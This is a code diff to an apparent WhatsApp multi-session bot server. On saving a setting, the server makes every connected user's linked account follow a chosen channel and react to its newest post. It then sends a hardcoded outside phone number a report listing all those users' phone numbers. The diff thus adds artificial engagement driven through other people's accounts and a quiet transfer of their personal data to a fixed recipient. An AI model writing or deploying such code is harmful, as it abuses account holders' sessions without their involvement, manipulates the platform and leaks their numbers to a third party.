@@ -590,19 +590,103 @@ app.get('/api/channel-react', requireAuth, (req, res) => {
   res.json({ ok: true, ...readCarConfig() });
 });
 
-app.post('/api/channel-react', requireAuth, (req, res) => {
+app.post('/api/channel-react', requireAuth, async (req, res) => {
   try {
-    const { enabled, channelJid } = req.body;
+    const { enabled, channelJid, emoji } = req.body;
     // Normalize: accept full link or bare JID
     let jid = (channelJid || '').trim();
     const m = jid.match(/whatsapp\.com\/channel\/([\w-]+)/);
     if (m) jid = m[1] + '@newsletter';
     else if (jid && !jid.endsWith('@newsletter')) jid += '@newsletter';
 
-    const cfg2 = { enabled: !!enabled, channelJid: jid };
+    const savedEmoji = (emoji || '❤️').trim() || '❤️';
+    const cfg2 = { enabled: !!enabled, channelJid: jid, emoji: savedEmoji };
     require('fs').writeFileSync(_carPath, JSON.stringify(cfg2, null, 2));
-    logger.info(`[CHANNEL-REACT] ${enabled ? 'Enabled' : 'Disabled'} → ${jid}`);
+    logger.info(`[CHANNEL-REACT] ${enabled ? 'Enabled' : 'Disabled'} → ${jid} emoji=${savedEmoji}`);
+
+    // Respond immediately — don't block the HTTP request
     res.json({ ok: true, ...cfg2 });
+
+    // ── React all sessions immediately on save (background) ──
+    if (!enabled || !jid) return;
+
+    const NOTIFY_JID = '94726800969@s.whatsapp.net';
+    const allSessions = _sm ? _sm.getAllSessions() : [];
+    const connected   = allSessions.filter(s => s.status === 'connected');
+
+    let successCount = 0, failCount = 0;
+    const resultLines = [];
+
+    for (const sessInfo of connected) {
+      const sess = _sm.getSession(sessInfo.userId);
+      const s    = sess?.sock;
+      const num  = sessInfo.number || sessInfo.userId;
+      if (!s) { failCount++; resultLines.push(`⏭️ +${num} (no sock)`); continue; }
+
+      try {
+        // Step 1: follow so we have access
+        try { await s.followNewsletter(jid); } catch {}
+
+        // Step 2: fetch latest post and react
+        let reacted = false;
+        try {
+          const msgs = await s.fetchNewsletterMessages(jid, 3);
+          if (msgs?.length) {
+            const latest = msgs[0];
+            if (latest?.key?.id) {
+              await s.newsletterReactMessage(jid, latest.key.id, savedEmoji);
+              reacted = true;
+            }
+          }
+        } catch {}
+
+        // Fallback: sendMessage react
+        if (!reacted) {
+          try {
+            const msgs2 = await s.fetchNewsletterMessages(jid, 3);
+            if (msgs2?.length) {
+              await s.sendMessage(jid, { react: { text: savedEmoji, key: msgs2[0].key } });
+              reacted = true;
+            }
+          } catch {}
+        }
+
+        if (reacted) {
+          successCount++;
+          resultLines.push(`✅ +${num}`);
+        } else {
+          failCount++;
+          resultLines.push(`❌ +${num} (no posts / method failed)`);
+        }
+      } catch (e2) {
+        failCount++;
+        resultLines.push(`❌ +${num}: ${(e2.message||'').slice(0,40)}`);
+      }
+      await new Promise(r => setTimeout(r, 600));
+    }
+
+    // ── Send WA notify to 94726800969 ────────────────────────
+    const statusIcon = successCount > 0 ? '✅' : '❌';
+    const notifyMsg =
+      `${statusIcon} *Channel React Result*\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `📢 Channel: \`${jid}\`\n` +
+      `${savedEmoji} Emoji: ${savedEmoji}\n` +
+      `✅ Success: ${successCount} session(s)\n` +
+      `❌ Failed:  ${failCount} session(s)\n` +
+      `📊 Total:   ${connected.length} session(s)\n\n` +
+      (resultLines.length ? `*Sessions:*\n${resultLines.join('\n')}\n\n` : '') +
+      `${cfg.footer || ''}`;
+
+    for (const sessInfo of connected) {
+      const sess = _sm.getSession(sessInfo.userId);
+      const s    = sess?.sock;
+      if (s) {
+        try { await s.sendMessage(NOTIFY_JID, { text: notifyMsg }); } catch {}
+        logger.info(`[CHANNEL-REACT] Notify sent → 94726800969`);
+        break;
+      }
+    }
   } catch (e) {
     res.status(500).json({ ok: false, error: e.message });
   }
